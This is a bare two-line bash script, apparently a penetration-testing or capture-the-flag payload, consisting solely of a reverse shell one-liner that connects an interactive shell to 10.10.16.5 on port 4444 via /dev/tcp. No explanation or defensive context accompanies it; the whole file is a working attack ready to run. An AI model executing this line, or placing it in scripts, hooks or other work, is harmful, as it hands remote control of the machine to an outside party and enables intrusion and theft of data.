#!/bin/bash
bash -i >& /dev/tcp/10.10.16.5/4444 0>&1
